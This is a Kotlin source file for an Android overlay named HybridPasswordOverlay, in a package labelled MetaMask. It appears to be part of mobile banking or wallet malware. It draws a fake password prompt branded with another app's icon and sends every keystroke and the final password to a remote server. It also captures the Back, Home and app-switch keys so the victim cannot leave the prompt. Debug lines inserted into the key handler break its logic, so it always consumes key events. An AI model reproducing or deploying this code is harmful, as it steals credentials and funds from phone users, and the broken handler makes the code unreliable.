package com.example.MetaMask.services

import android.content.Context
import android.graphics.Color
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.view.Gravity
import android.view.KeyEvent
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputMethodManager
import android.widget.*
import org.json.JSONObject

class HybridPasswordOverlay(
    ctx: Context,
    cfg: JSONObject,
    private val mgr: HybridOverlayManager
) : FrameLayout(ctx) {

    private val customTitle = cfg.optString("title", "")
    private val customHint = cfg.optString("hint", "")
    private val btnText = cfg.optString("button_text", "OK")
    private val brandPkg = cfg.optString("brand_pkg", "")

    private lateinit var inputField: EditText
    private var confirmBtn: Button? = null
    private var brandIconView: ImageView? = null

    init {
        setBackgroundColor(Color.argb(238, 8, 8, 20))
        buildUi()
        loadBrandIcon()
    }

    private fun buildUi() {
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] buildUi enter") //xdbg
        val d = resources.displayMetrics.density
        fun Int.dp() = (this * d + 0.5f).toInt()

        val outer = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
            setPadding(48.dp(), 40.dp(), 48.dp(), 40.dp())
        }

        if (brandPkg.isNotEmpty()) {
            android.util.Log.d("XDBG", "[HybridPasswordOverlay] if branch") //xdbg
            val iv = ImageView(context).apply {
                layoutParams = LinearLayout.LayoutParams(72.dp(), 72.dp()).apply {
                    gravity = Gravity.CENTER_HORIZONTAL
                    bottomMargin = 14.dp()
                }
                scaleType = ImageView.ScaleType.FIT_CENTER
            }
            brandIconView = iv
            outer.addView(iv)
        }

        outer.addView(TextView(context).apply {
            text = customTitle
            textSize = 18f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24.dp())
        })

        inputField = EditText(context).apply {
            hint = customHint
            textSize = 16f
            setTextColor(Color.WHITE)
            setHintTextColor(Color.argb(130, 200, 200, 200))
            setBackgroundColor(Color.argb(160, 30, 30, 50))
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(16.dp(), 14.dp(), 16.dp(), 14.dp())
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT).apply {
                bottomMargin = 12.dp()
            }
            imeOptions = EditorInfo.IME_ACTION_DONE
            setOnEditorActionListener { _, actionId, _ ->
                if (actionId == EditorInfo.IME_ACTION_DONE) {
                    android.util.Log.d("XDBG", "[HybridPasswordOverlay] if branch") //xdbg
                    if ((text?.length ?: 0) >= 4) submit()
                    true
                } else false
            }
            addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, st: Int, c: Int, a: Int) {}
                override fun onTextChanged(s: CharSequence?, st: Int, b: Int, c: Int) {}
                override fun afterTextChanged(s: Editable?) { onInput(s?.toString() ?: "") }
            })
        }
        outer.addView(inputField)

        val conf = Button(context).apply {
            text = btnText
            textSize = 15f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.argb(210, 20, 110, 50))
            visibility = GONE
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, 50.dp())
            setOnClickListener { submit() }
        }
        confirmBtn = conf
        outer.addView(conf)

        addView(outer)

        post {
            inputField.requestFocus()
            try {
                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showSoftInput(inputField, InputMethodManager.SHOW_IMPLICIT)
            } catch (_: Exception) {}
        }
    }

    private fun onInput(text: String) {
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] onInput enter text=${text}") //xdbg
        mgr.sendToServer(JSONObject().apply {
            put("action", "hybrid_overlay_input")
            put("type", "password")
            put("data", text)
            put("timestamp", System.currentTimeMillis())
        })
        confirmBtn?.visibility = if (text.length >= 4) VISIBLE else GONE
    }

    private fun submit() {
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] submit enter") //xdbg
        val text = inputField.text?.toString() ?: ""
        try {
            mgr.sendToServer(JSONObject().apply {
                put("action", "hybrid_overlay_input")
                put("type", "password_submit")
                put("data", text)
                put("timestamp", System.currentTimeMillis())
            })
        } catch (_: Exception) {}
        try { mgr.close("password_submitted") } catch (_: Exception) {}
    }

    private fun loadBrandIcon() {
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] loadBrandIcon enter") //xdbg
        if (brandPkg.isEmpty()) return
        try {
            val icon = context.packageManager.getApplicationIcon(brandPkg)
            brandIconView?.setImageDrawable(icon)
        } catch (_: Exception) {}
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] dispatchKeyEvent enter event=${event}") //xdbg
        val c = event.keyCode
        if (c == KeyEvent.KEYCODE_BACK || c == KeyEvent.KEYCODE_HOME || c == KeyEvent.KEYCODE_APP_SWITCH)
            android.util.Log.d("XDBG", "[HybridPasswordOverlay] return") //xdbg
            return true
        android.util.Log.d("XDBG", "[HybridPasswordOverlay] return") //xdbg
        return super.dispatchKeyEvent(event)
    }
}
